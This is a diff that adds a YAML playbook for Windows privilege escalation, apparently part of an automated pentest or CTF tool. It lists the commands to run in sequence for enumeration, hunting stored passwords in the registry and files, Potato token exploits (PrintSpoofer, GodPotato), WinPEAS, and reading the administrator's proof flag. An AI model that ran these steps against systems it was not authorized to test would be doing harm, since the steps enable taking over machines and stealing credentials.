@@ -1,0 +1,89 @@
+name: windows-privesc
+display_name: "Windows Privilege Escalation"
+description: "Systematic Windows privesc — from user shell to SYSTEM/Admin"
+
+applicable_when:
+  ports: [135, 139, 445, 3389, 5985]
+  services: ["msrpc", "smb", "rdp", "winrm"]
+
+steps:
+  - id: situational-awareness
+    name: "Situational Awareness"
+    phase: recon
+    description: "Gather basic system and user information"
+    commands:
+      - "whoami /all"
+      - "systeminfo"
+      - "hostname && ipconfig /all"
+      - "net users && net localgroup administrators"
+
+  - id: service-perms
+    name: "Service Permissions"
+    phase: enumeration
+    description: "Find services with weak permissions"
+    commands:
+      - "sc query state= all"
+      - "accesschk.exe /accepteula -uwcqv * *"
+      - "Get-Service | Where-Object {$_.Status -eq 'Running'}"
+
+  - id: unquoted-paths
+    name: "Unquoted Service Paths"
+    phase: enumeration
+    description: "Find unquoted service paths that can be hijacked"
+    commands:
+      - "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\""
+      - "Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\\Windows*' -and $_.PathName -match ' ' }"
+
+  - id: scheduled-tasks
+    name: "Scheduled Tasks"
+    phase: enumeration
+    description: "Look for abusable scheduled tasks"
+    commands:
+      - "schtasks /query /fo LIST /v"
+      - "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}"
+
+  - id: credentials
+    name: "Credential Hunting"
+    phase: credential-access
+    description: "Search for stored passwords and tokens"
+    commands:
+      - "cmdkey /list"
+      - "reg query HKLM /f password /t REG_SZ /s 2>nul | head -30"
+      - "findstr /si password *.txt *.xml *.ini *.config"
+      - "Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern password"
+
+  - id: always-install-elevated
+    name: "AlwaysInstallElevated"
+    phase: enumeration
+    description: "Check if MSI packages always install elevated"
+    commands:
+      - "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+      - "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+
+  - id: token-privs
+    name: "Token Privileges"
+    phase: enumeration
+    description: "Check for exploitable token privileges (Potato attacks)"
+    commands:
+      - "whoami /priv"
+      - "Check: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege"
+      - "PrintSpoofer.exe -i -c cmd"
+      - "GodPotato.exe -cmd 'cmd /c whoami'"
+
+  - id: automated-enum
+    name: "Automated Enumeration"
+    phase: enumeration
+    description: "Run WinPEAS or similar for comprehensive checks"
+    commands:
+      - ".\\winPEASx64.exe"
+      - "PowerUp.ps1: Invoke-AllChecks"
+
+  - id: admin-flag
+    name: "Capture Admin Flag"
+    phase: post-exploitation
+    description: "Get proof of admin/SYSTEM access"
+    commands:
+      - "type C:\\Users\\Administrator\\Desktop\\proof.txt"
+      - "whoami && hostname && ipconfig"
+    check:
+      flags: true
